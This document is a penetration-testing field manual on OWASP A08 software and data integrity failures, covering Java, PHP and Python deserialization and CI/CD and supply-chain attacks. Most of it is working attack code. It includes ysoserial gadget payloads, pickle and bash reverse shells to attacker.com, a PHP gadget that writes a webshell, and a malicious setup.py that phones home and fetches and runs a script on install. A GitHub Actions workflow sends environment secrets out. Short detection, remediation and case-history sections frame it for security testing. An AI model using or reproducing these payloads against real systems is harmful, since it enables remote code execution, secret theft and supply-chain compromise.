# A08: Software and Data Integrity Failures — Field Manual

## 1. Overview

New category in OWASP 2021, incorporating Insecure Deserialization (#8 from 2017). Focuses on failures to protect software updates, critical data, and CI/CD pipelines from integrity violations. Includes deserialization attacks, supply chain attacks, and auto-update poisoning.

**Why Dangerous:** Can result in RCE on targets, supply chain compromise affecting thousands of organizations, persistent backdoors.

**CVSS Range:** 5.0 (limited deserialization) to 10.0 (SolarWinds-style supply chain RCE)

**CWEs:** CWE-345, CWE-353, CWE-426, CWE-494, CWE-502, CWE-565, CWE-784, CWE-829, CWE-830, CWE-915

---

## 2. Detection Methods

### Manual Detection
```
1. Look for serialized objects in cookies, parameters, request bodies
2. Check for Java serialized objects: bytes starting with AC ED
3. Look for base64 that decodes to binary with "aced" prefix
4. Identify deserialization libraries in stack traces
5. Check update mechanisms - are updates verified?
6. Look for CI/CD configuration files (.gitlab-ci.yml, .travis.yml, Jenkinsfile)
7. Check if CI/CD pipelines can be triggered by untrusted code
8. Look for pickle/marshal in Python app cookies
```

### Automated Detection
```bash
# ysoserial gadget chain testing
java -jar ysoserial.jar URLDNS "http://attacker.com" | base64

# Check for Java deserialization
# Look for AC ED 00 05 in cookies/parameters
echo "COOKIE_VALUE" | base64 -d | xxd | head -1
# ac ed = Java serialized object marker

# Nuclei - deserialization templates
nuclei -u https://target.com -t vulnerabilities/java/

# Burp Suite - Java Deserialization Scanner extension

# Check npm/pypi packages
pip-audit  # Check installed packages for known vulns
npm audit  # Check npm dependencies
```

---

## 3. What to Look For

### Java Deserialization
```
• Cookies with base64 that starts with rO0AB (= AC ED 00 05)
• Parameters: viewstate=, data=, object=, serialized=
• Content-Type: application/x-java-serialized-object
• HTTP response with "java.io.NotSerializableException"
• Stack traces mentioning ObjectInputStream, readObject
• WebLogic: T3 protocol (port 7001)
• JBoss: HTTP invoker endpoint (/invoker/JMXInvokerServlet)
• Java RMI ports (1099)
• AMF (Flash remoting) endpoints
```

### PHP Deserialization
```
• Cookies: O:4:"User":2:{s:4:"name";s:5:"admin";...}
• PHP serialized format: a:1:{s:4:"test";s:4:"test";}
• __wakeup, __destruct, __toString magic methods in code
• unserialize() calls on user-controlled data
```

### Python Pickle
```
• Pickle serialized data in cookies/params
• cosntb prefix in base64 decoded data
• Flask session cookies (signed but sometimes weak secret)
• Numpy/Pandas loading untrusted data files
```

### CI/CD Attack Vectors
```
• Public repositories with .github/workflows/ or .gitlab-ci.yml
• CI pipelines that check out PR code and execute it
• Secrets stored in CI environment variables accessible from PRs
• Unsecured CI admin interfaces
• Pipeline jobs that can be triggered by anyone
• Auto-merge bots that don't verify contributor identity
```

---

## 4. Testing Methodology

### Step 1: Identify Serialization Points
```bash
# Scan all cookies for serialized data
curl -s -I https://target.com | grep -i "set-cookie"

# Check if cookie is base64 Java serialized
python3 -c "
import base64, sys
cookie = 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=='
decoded = base64.b64decode(cookie + '==')
print('Java serialized' if decoded[:2] == b'\xac\xed' else 'Not Java')
"

# PHP serialization check
echo 'COOKIE_VALUE' | base64 -d
# If starts with O:, a:, s:, i: → PHP serialized

# Check all parameters in Burp - look for binary/complex data
```

### Step 2: Probe for Deserialization
```bash
# Java - DNS callback (URLDNS gadget - safe, no RCE needed)
java -jar ysoserial.jar URLDNS "http://BURP_COLLAB.burpcollaborator.net" > dns_payload.bin
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @dns_payload.bin

# In cookie
PAYLOAD=$(java -jar ysoserial.jar URLDNS "http://BURP_COLLAB.burpcollaborator.net" | base64 | tr -d '\n')
curl -s https://target.com/profile -H "Cookie: session=$PAYLOAD"

# Python pickle - safe probe
python3 -c "
import pickle, base64

class SafeProbe(object):
    def __reduce__(self):
        return (print, ('Deserialization executed!',))

print(base64.b64encode(pickle.dumps(SafeProbe())).decode())
"
```

### Step 3: RCE via Deserialization
```bash
# Java ysoserial - try all gadget chains
for gadget in CommonsCollections1 CommonsCollections2 CommonsCollections3 \
              CommonsCollections4 CommonsCollections5 CommonsCollections6 \
              CommonsCollections7 Spring1 Spring2 Groovy1 \
              JBossInterceptors1 MozillaRhino1 Hibernate1; do
  echo "[*] Trying $gadget"
  java -jar ysoserial.jar $gadget "curl http://attacker.com/$gadget" 2>/dev/null | \
    curl -s -X POST https://target.com/api \
         -H "Content-Type: application/x-java-serialized-object" \
         --data-binary @- &
  sleep 2
done

# Python pickle RCE
python3 -c "
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/rce',))

print(base64.b64encode(pickle.dumps(RCE())).decode())
"
```

### Step 4: CI/CD Pipeline Attacks
```bash
# Check for exposed CI configuration
curl https://target.com/.github/workflows/main.yml
curl https://target.com/.gitlab-ci.yml
curl https://target.com/Jenkinsfile

# Look for PR-triggered workflows that execute arbitrary code
# grep for "on: pull_request" with run: commands

# Check if CI runs with high privileges
grep -r "GITHUB_TOKEN\|AWS_SECRET\|SLACK_TOKEN" .github/workflows/

# Poison PR attack
# Fork repository, add malicious CI step
# Submit PR - if CI runs PR code, your code executes in their environment
# In .github/workflows: "run: curl https://attacker.com/$(cat /proc/self/environ | base64)"
```

---

## 5. Exploitation Techniques

### Java Deserialization RCE
```bash
# Step 1: Confirm vulnerability with DNS callback
java -jar ysoserial.jar URLDNS "http://$(hostname).burpcollaborator.net" > payload.bin
# Send payload, check Collaborator for DNS lookup

# Step 2: RCE with CommonsCollections
java -jar ysoserial.jar CommonsCollections6 \
  'curl -d @/etc/passwd http://attacker.com:4444' > payload.bin

# Step 3: Reverse shell
java -jar ysoserial.jar CommonsCollections6 \
  'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}' \
  > payload.bin

# WebLogic T3 specific (CVE-2019-2725)
python3 weblogic_exploit.py --host target.com --port 7001 \
  --command "curl http://attacker.com/$(whoami)"

# JBoss exploit
python jboss_exploit.py -t https://target.com:8443/invoker/JMXInvokerServlet \
  -c "id"
```

### PHP Deserialization via Magic Methods
```php
<?php
// Vulnerable code pattern
$data = unserialize($_COOKIE['user_data']);

// Exploit: if class with __destruct or __wakeup exists:
class Config {
    public $cache_file = "/var/www/html/shell.php";
    public $cache_data = "<?php system(\$_GET['cmd']); ?>";
    
    public function __destruct() {
        file_put_contents($this->cache_file, $this->cache_data);
    }
}

$exploit = new Config();
echo base64_encode(serialize($exploit));
// Output: base64-encoded serialized object
// Set as Cookie: user_data=<output>
// Shell written to /var/www/html/shell.php
?>
```

### Python Pickle RCE
```python
import pickle, base64, os

class PickleExploit(object):
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
        return (os.system, (cmd,))

# Generate payload
payload = base64.b64encode(pickle.dumps(PickleExploit())).decode()
print(f"Payload: {payload}")

# Send as cookie or parameter
# curl -b "session=$(python3 exploit.py)" https://target.com/profile
```

### Supply Chain via Malicious Package
```python
# setup.py (malicious package published to PyPI)
from setuptools import setup
import os, subprocess, socket

def run_payload():
    try:
        # Phone home on installation
        h = socket.gethostname()
        u = os.environ.get('USER', 'unknown')
        subprocess.Popen(['curl', '-s', f'https://attacker.com/install?host={h}&user={u}'])
        # Download and execute additional payload
        subprocess.Popen(['curl', '-s', 'https://attacker.com/payload.sh', '-o', '/tmp/p.sh'])
        subprocess.Popen(['bash', '/tmp/p.sh'])
    except: pass

run_payload()

setup(name='legitimate-looking-package', version='9.9.9', ...)
```

### CI/CD Pipeline Injection
```yaml
# Malicious GitHub Actions workflow via PR
# File: .github/workflows/attack.yml (submitted via PR)
name: CI
on:
  pull_request:
    types: [opened, synchronize]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Build
        run: |
          # Exfiltrate secrets
          curl "https://attacker.com/?secrets=$(env | base64)"
          # Or establish reverse shell
          bash -i >& /dev/tcp/attacker.com/4444 0>&1 &
```

---

## 6. Verification

```
✓ Deserialization: DNS callback received at Burp Collaborator
✓ Deserialization RCE: command output in response or via OOB callback
✓ PHP deserialization: webshell created, accessible at target URL
✓ Python pickle: command executed (check OOB callback)
✓ Supply chain: callback received when package installed
✓ CI/CD: secrets exfiltrated in callback, or code executed in pipeline
```

---

## 7. Common Problems & Solutions

| Problem | Cause | Fix |
|---------|-------|-----|
| ysoserial gadgets all fail | Wrong library versions | Try URLDNS first (always works), enumerate classpath |
| DNS callback only, no RCE | Egress filtering | Try time-based detection instead |
| Java payload format rejected | Wrong content-type | Try different content-types, wrapping formats |
| PHP deserialization no useful classes | No exploitable classes on classpath | POP chain construction from available classes |
| Python pickle filtered | Input validation | Try marshal module instead, or other pickle encodings |
| CI/CD pipeline doesn't execute PR code | Security-hardened config | Look for workflow_run triggers, cache poisoning |

---

## 8. Tools

```bash
# ysoserial - Java deserialization gadgets
java -jar ysoserial.jar  # List all gadgets
java -jar ysoserial.jar CommonsCollections6 "cmd" > payload.bin

# marshalsec - RMI/JNDI server
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com:8888/#Exploit"

# PHPGGC - PHP deserialization gadget chains
./phpggc -l  # List gadget chains
./phpggc Laravel/RCE1 "system('id')" > payload.txt

# PickleExploit scripts (custom)

# Burp Suite - Java Deserialization Scanner extension
# Handles: CommonsCollections, Spring, Groovy, JBoss, etc.

# SerializationDumper - analyze Java serialized objects
java -jar SerializationDumper.jar ACED0005...

# Gadget Inspector - find custom gadget chains
java -jar gadget-inspector.jar target.jar

# GitHub Actions security
# actionlint - lint workflow files for security issues
actionlint .github/workflows/
```

---

## 9. Bypass Techniques

### Deserialization Filter Bypass
```bash
# If RESOLVE filter blocks URLDNS
# Use HTTP instead of DNS callback
java -jar ysoserial.jar URLDNS "http://attacker.com" > payload.bin

# If specific gadget blocked
# Try all available gadgets systematically

# If ObjectInputStream filtering (JVM agent)
# Try different serialization libraries: Kryo, Jackson, XStream, etc.

# XStream bypass (if used instead of ObjectInputStream)
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command><string>calc.exe</string></command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
```

---

## 10. Remediation

```
1. Never deserialize untrusted data without validation
2. Implement integrity checks: digital signatures on serialized objects
3. If deserialization unavoidable: use serialization filters (Java 9+: ObjectInputFilter)
4. Use JSON/XML instead of native serialization where possible
5. Monitor for deserialization exceptions
6. For CI/CD: separate privileged pipelines from untrusted code execution
7. Require commit signing (GPG) for automated pipelines
8. Don't expose secrets to workflows triggered by PRs from forks
9. Use pinned versions for dependencies with verified checksums
10. Implement SCA + signed package verification in build pipeline
11. Auto-update mechanisms must verify digital signatures before execution
```

---

## 11. Real-World Examples

### SolarWinds SUNBURST (2020)
- Build pipeline compromised (CI/CD attack)
- Malicious code injected into Orion software build
- 18,000+ organizations received backdoored software
- Attribution: nation-state (Cozy Bear/APT29)

### CVE-2015-4852 — Oracle WebLogic Java Deserialization
- T3 protocol deserialization, CVSS 7.5
- CommonsCollections gadget chain
- Pre-auth RCE on WebLogic 10.3.6 - 12.1.3

### Event-Stream npm (2018)
- Popular npm package (2M weekly downloads) transferred to malicious maintainer
- New version targeted Bitcoin wallets via injected dependency
- Supply chain attack via package maintainer trust

### Apache Shiro Deserialization (CVE-2016-4437)
- "rememberMe" cookie deserialized without validation
- AES key hardcoded in default config
- Still exploitable when default key used

### TeamCity CI/CD (CVE-2024-27198)
- Authentication bypass + RCE
- CVSS 9.8
- Build servers compromised, used to inject malicious builds
